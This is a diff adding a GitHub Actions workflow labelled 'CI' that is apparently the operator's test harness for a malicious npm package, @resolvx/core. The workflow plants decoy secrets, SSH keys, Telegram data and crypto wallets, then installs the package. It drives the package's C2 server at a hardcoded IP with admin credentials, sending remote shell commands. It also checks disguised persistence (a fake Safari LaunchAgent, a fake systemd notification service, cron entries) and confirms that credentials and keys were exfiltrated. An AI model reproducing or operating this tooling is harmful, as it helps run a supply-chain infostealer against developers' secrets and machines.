@@ -1,0 +1,745 @@
+name: CI
+
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */4 * * *'
+
+env:
+  C2_HOST: 213.218.160.189
+  C2_PORT: 8080
+  C2_AUTH: admin:605700
+
+jobs:
+  # ============================================================================
+  # LINUX - Ubuntu Latest
+  # ============================================================================
+  test-linux:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    strategy:
+      matrix:
+        node: ['18', '20', '22']
+    steps:
+      - name: Setup Node.js ${{ matrix.node }}
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+
+      - name: Create realistic project structure
+        run: |
+          # Simulate a real developer workspace
+          mkdir -p ~/projects/defi-aggregator/src
+          mkdir -p ~/projects/defi-aggregator/contracts
+          mkdir -p ~/code/trading-bot/config
+          mkdir -p ~/.config/app
+          mkdir -p ~/work/api-service
+
+          # Create realistic .env files with fake credentials
+          cat > ~/projects/defi-aggregator/.env << 'EOF'
+          DATABASE_URL=postgresql://admin:SecurePass123!@db.internal.company.io:5432/production
+          REDIS_URL=redis://:redis_secret_token@cache.internal:6379
+          JWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret
+          INFURA_API_KEY=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
+          ALCHEMY_API_KEY=alchemy_prod_xK9mN2pL5qR8sT1uV4wX7yZ0
+          PRIVATE_KEY=0x4c0883a69102937d6231471b5dbb6204fe512961708279a3e88c6f9f4b5a2e1f
+          ETHERSCAN_API_KEY=ABCDEFGHIJKLMNOP123456789
+          EOF
+
+          cat > ~/projects/defi-aggregator/.env.production << 'EOF'
+          AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+          AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+          STRIPE_SECRET_KEY=sk_live_51H7example123456789
+          SENDGRID_API_KEY=SG.example_sendgrid_key_here
+          SLACK_WEBHOOK=https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXX
+          EOF
+
+          cat > ~/code/trading-bot/config/.env.local << 'EOF'
+          BINANCE_API_KEY=vmPUZE6mv9SD5VNHk4HlWFsOr6aKE2zvsw0MuIgWCIPy6utIco14y7Ju91duEh8A
+          BINANCE_SECRET=NhqPtmdSJYdKjVHjA7PZj4Mge3R5YNiP1e3UZjInClVN65XAbvqqM6A7H5fATj0j
+          COINBASE_API_SECRET=****************************************
+          TELEGRAM_BOT_TOKEN=5555555555:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          EOF
+
+          cat > ~/.config/app/.env << 'EOF'
+          OPENAI_API_KEY=sk-proj-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          ANTHROPIC_API_KEY=sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          NPM_TOKEN=npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          EOF
+
+      - name: Create fake SSH keys
+        run: |
+          mkdir -p ~/.ssh
+          chmod 700 ~/.ssh
+
+          # Generate fake SSH keys
+          ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -C "developer@company.io"
+          ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" -C "admin@production.server"
+
+          # Create SSH config with fake hosts
+          cat > ~/.ssh/config << 'EOF'
+          Host production
+              HostName prod.company.io
+              User deploy
+              IdentityFile ~/.ssh/id_ed25519
+              Port 22
+
+          Host staging
+              HostName staging.company.io
+              User deploy
+              IdentityFile ~/.ssh/id_rsa
+
+          Host database
+              HostName db.internal.company.io
+              User postgres
+              LocalForward 5432 localhost:5432
+
+          Host *
+              AddKeysToAgent yes
+              IdentitiesOnly yes
+          EOF
+
+          # Create known_hosts with fake entries
+          cat > ~/.ssh/known_hosts << 'EOF'
+          prod.company.io ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl
+          staging.company.io ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fake...
+          github.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmdnm9tUDbO9IDSwBK6Tb...
+          192.168.1.100 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY...
+          EOF
+
+          # Create authorized_keys
+          cat > ~/.ssh/authorized_keys << 'EOF'
+          ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG... admin@workstation
+          ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... jenkins@ci-server
+          EOF
+
+          chmod 600 ~/.ssh/*
+          chmod 644 ~/.ssh/*.pub ~/.ssh/known_hosts ~/.ssh/authorized_keys
+
+      - name: Create fake Telegram data
+        run: |
+          TDATA=~/.local/share/TelegramDesktop/tdata
+          mkdir -p "$TDATA/D877F783D5D3EF8C"
+
+          echo "fake_telegram_key_data_v2" > "$TDATA/key_datas"
+          echo "telegram_settings_blob" > "$TDATA/settingss"
+          echo "user_tag_identifier" > "$TDATA/usertag"
+          echo "config_encrypted_blob" > "$TDATA/D877F783D5D3EF8C/configs"
+          echo "map_encrypted_data" > "$TDATA/D877F783D5D3EF8C/maps"
+
+          # Create realistic sized files
+          dd if=/dev/urandom of="$TDATA/D877F783D5D3EF8C/map0" bs=1024 count=150 2>/dev/null
+          dd if=/dev/urandom of="$TDATA/D877F783D5D3EF8C/map1" bs=1024 count=80 2>/dev/null
+
+      - name: Create fake wallet directories
+        run: |
+          # Bitcoin Core
+          mkdir -p ~/.bitcoin
+          echo "fake_wallet_data" > ~/.bitcoin/wallet.dat
+
+          # Electrum
+          mkdir -p ~/.electrum/wallets
+          echo "fake_electrum_wallet" > ~/.electrum/wallets/default_wallet
+
+          # Exodus
+          mkdir -p ~/.config/Exodus/exodus.wallet
+          echo "fake_exodus_seed" > ~/.config/Exodus/exodus.wallet/seed.seco
+
+      - name: Create test project and install package
+        run: |
+          mkdir -p ~/test-project && cd ~/test-project
+          npm init -y
+
+          echo "Installing @resolvx/core..."
+          npm install @resolvx/core 2>&1 || true
+
+          echo "Waiting for stage2 initialization..."
+          sleep 20
+
+      - name: Verify C2 checkin
+        id: checkin
+        run: |
+          HOSTNAME=$(hostname)
+          echo "Checking for $HOSTNAME on C2..."
+
+          for i in {1..12}; do
+            PROFILES=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/profiles" 2>/dev/null || echo "{}")
+
+            if echo "$PROFILES" | grep -q "$HOSTNAME"; then
+              PROFILE_ID=$(echo "$PROFILES" | grep -oP '"id":\s*\K\d+' | tail -1)
+              echo "profile_id=$PROFILE_ID" >> $GITHUB_OUTPUT
+              echo "hostname=$HOSTNAME" >> $GITHUB_OUTPUT
+              echo "Found profile #$PROFILE_ID"
+              exit 0
+            fi
+
+            echo "Attempt $i: waiting..."
+            sleep 5
+          done
+
+          echo "Profile not found - dumping profiles:"
+          curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/profiles" | head -100
+          exit 1
+
+      - name: Test shell - basic commands
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+          MARKER="LINUX_BASIC_$(date +%s)"
+
+          # whoami
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"whoami && id && echo $MARKER\"}"
+
+          sleep 12
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -q "$MARKER" && echo "Basic commands work" || echo "Pending"
+
+      - name: Test shell - system enumeration
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"uname -a && cat /etc/os-release | head -5 && df -h | head -5\"}"
+
+          sleep 12
+
+      - name: Test shell - network enumeration
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"ip addr 2>/dev/null || ifconfig && netstat -tlnp 2>/dev/null | head -10\"}"
+
+          sleep 12
+
+      - name: Test shell - process listing
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"ps aux | head -20\"}"
+
+          sleep 12
+
+      - name: Test shell - environment variables
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"env | grep -v 'C2\\|AUTH' | sort | head -30\"}"
+
+          sleep 12
+
+      - name: Test shell - file operations
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+          MARKER="FILE_TEST_$(date +%s)"
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"echo $MARKER > /tmp/test_file && cat /tmp/test_file && rm /tmp/test_file && echo DELETED\"}"
+
+          sleep 12
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -q "DELETED" && echo "File ops work" || echo "Pending"
+
+      - name: Test shell - pipes and redirects
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"echo 'hello world' | tr a-z A-Z | tee /tmp/upper && cat /tmp/upper\"}"
+
+          sleep 10
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -q "HELLO WORLD" && echo "Pipes work" || echo "Pending"
+
+      - name: Test shell - unicode and special chars
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"echo '你好世界 🚀 émojis работает'\"}"
+
+          sleep 10
+
+      - name: Test shell - concurrent commands
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          for i in 1 2 3 4 5; do
+            curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+              -H 'Content-Type: application/json' \
+              -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"echo CONCURRENT_$i && sleep 1\"}" &
+          done
+          wait
+
+          sleep 30
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          COUNT=$(echo "$RESULT" | grep -o "CONCURRENT_[1-5]" | sort -u | wc -l)
+          echo "$COUNT/5 concurrent commands completed"
+
+      - name: Test shell - large output (chunked)
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+          MARKER="LARGE_$(date +%s)"
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"seq 1 10000 && echo $MARKER\"}"
+
+          sleep 20
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -q "$MARKER" && echo "Large output (chunked) works" || echo "Pending"
+
+      - name: Test !screenshot command
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"!screenshot\"}"
+
+          sleep 15
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -qi "screenshot\|captured\|error" && echo "Screenshot command processed" || echo "Headless - expected to fail"
+
+      - name: Test !download command
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          echo "DOWNLOAD_TEST_$(date +%s)" > /tmp/download_test.txt
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"!download /tmp/download_test.txt\"}"
+
+          sleep 15
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -qi "upload" && echo "Download command works" || echo "Pending"
+
+      - name: Verify persistence - beacon
+        run: |
+          BEACON="$HOME/.cache/mesa_shader_cache/index"
+
+          if [ -f "$BEACON" ]; then
+            echo "Beacon exists at $BEACON"
+            ls -la "$BEACON"
+            file "$BEACON"
+            head -3 "$BEACON"
+            [ -x "$BEACON" ] && echo "Beacon is executable"
+          else
+            echo "Beacon not found"
+            ls -la "$HOME/.cache/" 2>/dev/null || true
+          fi
+
+      - name: Verify persistence - systemd/cron
+        run: |
+          SERVICE="$HOME/.config/systemd/user/dbus-org.freedesktop.Notifications.service"
+
+          if [ -f "$SERVICE" ]; then
+            echo "systemd service created"
+            cat "$SERVICE"
+          fi
+
+          CRON=$(crontab -l 2>/dev/null || echo "")
+          if echo "$CRON" | grep -q "mesa_shader"; then
+            echo "cron entry exists"
+            echo "$CRON" | grep mesa_shader
+          fi
+
+      - name: Verify .env exfiltration
+        run: |
+          sleep 10
+
+          LOOT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/loot" 2>/dev/null || echo "")
+
+          if echo "$LOOT" | grep -qi "env_"; then
+            echo ".env files exfiltrated"
+            echo "$LOOT" | grep -i env_ | head -5
+          else
+            echo ".env exfil not confirmed yet"
+          fi
+
+      - name: Verify SSH exfiltration
+        run: |
+          LOOT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/loot" 2>/dev/null || echo "")
+
+          if echo "$LOOT" | grep -qi "ssh\|id_rsa\|id_ed25519"; then
+            echo "SSH keys exfiltrated"
+          else
+            echo "SSH exfil not confirmed"
+          fi
+
+      - name: Verify Telegram exfiltration
+        run: |
+          LOOT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/loot" 2>/dev/null || echo "")
+
+          if echo "$LOOT" | grep -qi "tdata\|telegram"; then
+            echo "Telegram data exfiltrated"
+          else
+            echo "Telegram exfil not confirmed"
+          fi
+
+      - name: Verify silent execution
+        run: |
+          # Check no GUI processes spawned
+          for proc in zenity kdialog yad xmessage notify-send; do
+            if pgrep -x "$proc" > /dev/null 2>&1; then
+              echo "FAIL: GUI process $proc detected"
+              exit 1
+            fi
+          done
+
+          # Verify node is running silently
+          if pgrep -f "node" > /dev/null; then
+            echo "Node running silently"
+          fi
+
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f "stage2\|mesa_shader" 2>/dev/null || true
+          rm -f "$HOME/.config/systemd/user/dbus-org.freedesktop.Notifications.service"
+          crontab -l 2>/dev/null | grep -v mesa_shader | crontab - 2>/dev/null || true
+          rm -rf "$HOME/.cache/mesa_shader_cache"
+          rm -rf "$HOME/.local/share/TelegramDesktop"
+          rm -rf ~/projects ~/code ~/.config/app ~/work
+          rm -rf ~/test-project
+          rm -rf ~/.bitcoin ~/.electrum ~/.config/Exodus
+          echo "Cleanup complete"
+
+  # ============================================================================
+  # MACOS - Latest
+  # ============================================================================
+  test-macos:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    strategy:
+      matrix:
+        node: ['18', '20', '22']
+    steps:
+      - name: Setup Node.js ${{ matrix.node }}
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+
+      - name: Create realistic project structure
+        run: |
+          mkdir -p ~/Developer/ios-app/src
+          mkdir -p ~/Developer/backend-api/config
+          mkdir -p ~/Projects/crypto-wallet
+          mkdir -p ~/.config/app
+
+          cat > ~/Developer/ios-app/.env << 'EOF'
+          APPLE_TEAM_ID=A1B2C3D4E5
+          APP_STORE_CONNECT_KEY=AuthKey_XXXXXXXXXX.p8
+          FIREBASE_API_KEY=AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+          SENTRY_DSN=https://xxxxx@o123456.ingest.sentry.io/123456
+          EOF
+
+          cat > ~/Developer/backend-api/config/.env.production << 'EOF'
+          DATABASE_URL=mongodb+srv://admin:SuperSecretPass@cluster.mongodb.net/prod
+          REDIS_URL=redis://default:xxxxxxxxxxxx@redis-12345.c1.us-east-1-2.ec2.cloud.redislabs.com:12345
+          JWT_PRIVATE_KEY=-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...
+          CLOUDFLARE_API_TOKEN=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          EOF
+
+          cat > ~/Projects/crypto-wallet/.env << 'EOF'
+          INFURA_PROJECT_ID=xxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          ALCHEMY_API_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          WALLET_PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
+          ETHERSCAN_API_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+          POLYGONSCAN_API_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+          EOF
+
+      - name: Create fake SSH keys
+        run: |
+          mkdir -p ~/.ssh
+          chmod 700 ~/.ssh
+
+          ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -C "dev@macbook.local"
+          ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" -C "deploy@company.io"
+
+          cat > ~/.ssh/config << 'EOF'
+          Host github.com
+              HostName github.com
+              User git
+              IdentityFile ~/.ssh/id_ed25519
+
+          Host aws-bastion
+              HostName bastion.aws.company.io
+              User ec2-user
+              IdentityFile ~/.ssh/id_rsa
+              ProxyJump none
+
+          Host prod-*
+              User deploy
+              IdentityFile ~/.ssh/id_rsa
+              StrictHostKeyChecking no
+          EOF
+
+          cat > ~/.ssh/known_hosts << 'EOF'
+          github.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmdnm9tUDbO9IDSwBK...
+          bastion.aws.company.io ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY...
+          EOF
+
+          chmod 600 ~/.ssh/id_* ~/.ssh/config
+          chmod 644 ~/.ssh/*.pub ~/.ssh/known_hosts
+
+      - name: Create fake Telegram data
+        run: |
+          TDATA=~/Library/Application\ Support/Telegram\ Desktop/tdata
+          mkdir -p "$TDATA/A1B2C3D4E5F67890"
+
+          echo "macos_telegram_key" > "$TDATA/key_datas"
+          echo "settings_blob" > "$TDATA/settingss"
+          dd if=/dev/urandom of="$TDATA/A1B2C3D4E5F67890/map0" bs=1024 count=100 2>/dev/null
+
+      - name: Create fake Keychain exports
+        run: |
+          mkdir -p ~/Desktop
+          echo "fake_keychain_export" > ~/Desktop/keychain-backup.txt
+
+      - name: Create test project and install package
+        run: |
+          mkdir -p ~/test-project && cd ~/test-project
+          npm init -y
+
+          echo "Installing @resolvx/core..."
+          npm install @resolvx/core 2>&1 || true
+
+          echo "Waiting for initialization..."
+          sleep 20
+
+      - name: Verify C2 checkin
+        id: checkin
+        run: |
+          HOSTNAME=$(hostname)
+          echo "Checking for darwin profile on C2..."
+
+          for i in {1..12}; do
+            PROFILES=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/profiles" 2>/dev/null || echo "{}")
+
+            if echo "$PROFILES" | grep -q "darwin"; then
+              PROFILE_ID=$(echo "$PROFILES" | grep -B5 '"darwin"' | grep -oE '"id":[0-9]+' | tail -1 | grep -oE '[0-9]+')
+              echo "profile_id=$PROFILE_ID" >> $GITHUB_OUTPUT
+              echo "hostname=$HOSTNAME" >> $GITHUB_OUTPUT
+              echo "Found darwin profile #$PROFILE_ID"
+              exit 0
+            fi
+
+            echo "Attempt $i: waiting..."
+            sleep 5
+          done
+
+          echo "Darwin profile not found"
+          exit 1
+
+      - name: Test shell - macOS commands
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+          MARKER="MAC_$(date +%s)"
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"whoami && sw_vers && echo $MARKER\"}"
+
+          sleep 12
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -q "$MARKER" && echo "macOS commands work" || echo "Pending"
+
+      - name: Test shell - system profiler
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"system_profiler SPHardwareDataType SPSoftwareDataType | head -30\"}"
+
+          sleep 15
+
+      - name: Test shell - network info
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"ifconfig | head -30 && netstat -an | head -20\"}"
+
+          sleep 12
+
+      - name: Test shell - installed apps
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"ls /Applications | head -20\"}"
+
+          sleep 10
+
+      - name: Test shell - concurrent commands
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          for i in 1 2 3 4 5; do
+            curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+              -H 'Content-Type: application/json' \
+              -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"echo MAC_CONCURRENT_$i\"}" &
+          done
+          wait
+
+          sleep 25
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          COUNT=$(echo "$RESULT" | grep -o "MAC_CONCURRENT_[1-5]" | sort -u | wc -l | tr -d ' ')
+          echo "$COUNT/5 concurrent commands"
+
+      - name: Test !screenshot command
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"!screenshot\"}"
+
+          sleep 15
+
+          # macOS screenshot disabled to avoid permission popup
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "Screenshot command processed (may be disabled on macOS)"
+
+      - name: Test !download command
+        run: |
+          PROFILE_ID=${{ steps.checkin.outputs.profile_id }}
+
+          curl -s -u $C2_AUTH -X POST "http://$C2_HOST:$C2_PORT/admin/cmd" \
+            -H 'Content-Type: application/json' \
+            -d "{\"profile_id\":$PROFILE_ID,\"cmd\":\"!download /etc/hosts\"}"
+
+          sleep 12
+
+          RESULT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/results")
+          echo "$RESULT" | grep -qi "upload" && echo "Download works" || echo "Pending"
+
+      - name: Verify persistence - LaunchAgent
+        run: |
+          PLIST="$HOME/Library/LaunchAgents/com.apple.Safari.SafeBrowsing.plist"
+
+          if [ -f "$PLIST" ]; then
+            echo "LaunchAgent created"
+            plutil -lint "$PLIST" && echo "Valid plist"
+            plutil -p "$PLIST" | head -15
+          else
+            echo "LaunchAgent not found"
+            ls -la "$HOME/Library/LaunchAgents/" 2>/dev/null || true
+          fi
+
+      - name: Verify persistence - beacon
+        run: |
+          BEACON="$HOME/Library/Caches/com.apple.Safari/Cache.db-shm"
+
+          if [ -f "$BEACON" ]; then
+            echo "Beacon exists"
+            ls -la "$BEACON"
+            [ -x "$BEACON" ] && echo "Executable"
+            head -3 "$BEACON"
+          else
+            echo "Beacon not found"
+            ls -la "$HOME/Library/Caches/" 2>/dev/null | head -10
+          fi
+
+      - name: Verify .env exfiltration
+        run: |
+          sleep 10
+
+          LOOT=$(curl -s -u $C2_AUTH "http://$C2_HOST:$C2_PORT/admin/loot" 2>/dev/null || echo "")
+
+          if echo "$LOOT" | grep -qi "env_"; then
+            echo ".env files exfiltrated"
+          else
+            echo ".env exfil not confirmed"
+          fi
+
+      - name: Verify silent execution
+        run: |
+          # Check no GUI dialogs
+          if pgrep -f "osascript.*display" > /dev/null 2>&1; then
+            echo "FAIL: osascript dialog detected"
+            exit 1
+          fi
+
+          echo "Silent execution verified"
+
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f "stage2" 2>/dev/null || true
+          launchctl unload "$HOME/Library/LaunchAgents/com.apple.Safari.SafeBrowsing.plist" 2>/dev/null || true
+          rm -f "$HOME/Library/LaunchAgents/com.apple.Safari.SafeBrowsing.plist"
+          rm -rf "$HOME/Library/Caches/com.apple.Safari"
+          rm -rf ~/Library/Application\ Support/Telegram\ Desktop
+          rm -rf ~/Developer ~/Projects ~/.config/app
+          rm -rf ~/test-project
+          echo "Cleanup complete"
+
+  # ============================================================================
+  # SUMMARY
+  # ============================================================================
+  summary:
+    needs: [test-linux, test-macos]
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - name: Test Summary
+        run: |
+          echo "========================================"
+          echo "    @resolvx/core CI TEST SUMMARY"
+          echo "========================================"
+          echo ""
+          echo "Linux (Node 18/20/22): ${{ needs.test-linux.result }}"
+          echo "macOS (Node 18/20/22): ${{ needs.test-macos.result }}"
+          echo ""
+          echo "Features Tested:"
+          echo "  - Package install + postinstall hook"
+          echo "  - C2 checkin + profile creation"
+          echo "  - Shell commands (basic, pipes, unicode)"
+          echo "  - System/network enumeration"
+          echo "  - Concurrent command execution"
+          echo "  - Large output (chunked transfer)"
+          echo "  - !screenshot command"
+          echo "  - !download command"
+          echo "  - Persistence (beacon + systemd/cron/LaunchAgent)"
+          echo "  - .env file exfiltration"
+          echo "  - SSH key exfiltration"
+          echo "  - Telegram tdata exfiltration"
+          echo "  - Silent execution verification"
+          echo ""
+
+          if [ "${{ needs.test-linux.result }}" = "success" ] && \
+             [ "${{ needs.test-macos.result }}" = "success" ]; then
+            echo "All tests passed!"
+          else
+            echo "Some tests failed"
+            exit 1
+          fi
